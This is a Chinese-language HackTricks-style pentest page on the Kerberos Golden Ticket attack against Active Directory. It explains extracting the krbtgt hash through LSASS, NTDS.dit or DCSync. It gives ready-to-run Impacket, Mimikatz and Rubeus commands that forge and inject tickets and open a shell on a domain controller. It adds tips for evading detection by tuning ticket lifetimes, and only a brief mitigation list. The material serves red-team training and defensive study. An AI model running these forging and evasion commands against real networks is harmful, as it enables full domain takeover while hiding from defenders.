# 金票

<details>

<summary><strong>从零开始学习AWS黑客技术，成为专家</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE（HackTricks AWS红队专家）</strong></a><strong>！</strong></summary>

支持HackTricks的其他方式：

* 如果您想看到您的**公司在HackTricks中做广告**或**下载PDF格式的HackTricks**，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)!
* 获取[**官方PEASS & HackTricks周边产品**](https://peass.creator-spring.com)
* 探索[**PEASS家族**](https://opensea.io/collection/the-peass-family)，我们的独家[**NFTs**](https://opensea.io/collection/the-peass-family)
* **加入** 💬 [**Discord群组**](https://discord.gg/hRep4RUj7f) 或 [**电报群组**](https://t.me/peass) 或 **关注**我的**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**。**
* 通过向[**HackTricks**](https://github.com/carlospolop/hacktricks)和[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github仓库提交PR来分享您的黑客技巧。

</details>

## 金票

**金票**攻击是指通过使用**Active Directory (AD) krbtgt账户的NTLM哈希值**创建合法的票据授予票据（TGT）来冒充任何用户。这种技术特别有利，因为它**使得可以访问域内的任何服务或计算机**，就像冒充的用户一样。关键是要记住**krbtgt账户的凭据不会自动更新**。

要**获取krbtgt账户的NTLM哈希值**，可以采用各种方法。可以从域内任何域控制器（DC）上的**本地安全性子系统服务（LSASS）进程**或**NT目录服务（NTDS.dit）文件**中提取。此外，**执行DCsync攻击**是另一种获取此NTLM哈希值的策略，可以使用Mimikatz中的**lsadump::dcsync模块**或Impacket的**secretsdump.py脚本**执行。重要的是要强调，要执行这些操作，通常需要**域管理员权限或类似级别的访问权限**。

尽管NTLM哈希值可用于此目的，但出于操作安全原因，**强烈建议**使用**高级加密标准（AES）Kerberos密钥（AES128和AES256）**来伪造票据。
```bash
python ticketer.py -nthash 25b2076cda3bfd6209161a6c78a69c1c -domain-sid S-1-5-21-1339291983-1349129144-367733775 -domain jurassic.park stegosaurus
export KRB5CCNAME=/root/impacket-examples/stegosaurus.ccache
python psexec.py jurassic.park/stegosaurus@lab-wdc02.jurassic.park -k -no-pass
```
{% endcode %}

{% code title="来自Windows" %}
```bash
#mimikatz
kerberos::golden /User:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /krbtgt:ff46a9d8bd66c6efd77603da26796f35 /id:500 /groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ptt
.\Rubeus.exe ptt /ticket:ticket.kirbi
klist #List tickets in memory

# Example using aes key
kerberos::golden /user:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /aes256:430b2fdb13cc820d73ecf123dddd4c9d76425d4c2156b89ac551efb9d591a439 /ticket:golden.kirbi
```
{% endcode %}

**一旦**您注入了**黄金票证**，您就可以访问共享文件**(C$)**，并执行服务和WMI，因此您可以使用**psexec**或**wmiexec**来获得一个shell（看起来您无法通过winrm获得shell）。

### 绕过常见检测

检测黄金票证最常见的方法是通过检查Kerberos流量。默认情况下，Mimikatz**为TGT签名10年**，这在随后使用TGT进行的TGS请求中会显得异常。

`Lifetime : 3/11/2021 12:39:57 PM ; 3/9/2031 12:39:57 PM ; 3/9/2031 12:39:57 PM`

使用`/startoffset`、`/endin`和`/renewmax`参数来控制开始偏移、持续时间和最大续订次数（均以分钟为单位）。
```
Get-DomainPolicy | select -expand KerberosPolicy
```
```markdown
不幸的是，TGT 的生命周期未记录在 4769 中，因此您在 Windows 事件日志中找不到此信息。然而，您可以关联的是**在没有先前的 4768 的情况下看到 4769**。**没有 TGT 的情况下无法请求 TGS**，如果没有 TGT 发行的记录，我们可以推断它是离线伪造的。

为了**绕过此检测**，检查 diamond tickets：

{% content-ref url="diamond-ticket.md" %}
[diamond-ticket.md](diamond-ticket.md)
{% endcontent-ref %}

### 缓解

* 4624: 帐户登录
* 4672: 管理员登录
* `Get-WinEvent -FilterHashtable @{Logname='Security';ID=4672} -MaxEvents 1 | Format-List –Property`

防御者可以做的其他小技巧是**对敏感用户的 4769 进行警报**，例如默认域管理员帐户。

## 参考资料
* [https://www.tarlogic.com/blog/how-to-attack-kerberos/](https://www.tarlogic.com/blog/how-to-attack-kerberos/)
* [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-golden-tickets] (https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-golden-tickets)

<details>

<summary><strong>从零开始学习 AWS 黑客技术，成为专家</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE（HackTricks AWS 红队专家）</strong></a><strong>！</strong></summary>

支持 HackTricks 的其他方式：

* 如果您想看到您的**公司在 HackTricks 中做广告**或**下载 PDF 版本的 HackTricks**，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)!
* 获取[**官方 PEASS & HackTricks 商品**](https://peass.creator-spring.com)
* 探索[**PEASS 家族**](https://opensea.io/collection/the-peass-family)，我们的独家[**NFT**](https://opensea.io/collection/the-peass-family)收藏品
* **加入** 💬 [**Discord 群组**](https://discord.gg/hRep4RUj7f) 或 [**电报群组**](https://t.me/peass) 或在 **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)** 上**关注我。
* 通过向 [**HackTricks**](https://github.com/carlospolop/hacktricks) 和 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github 仓库提交 PR 来**分享您的黑客技巧**。

</details>
```
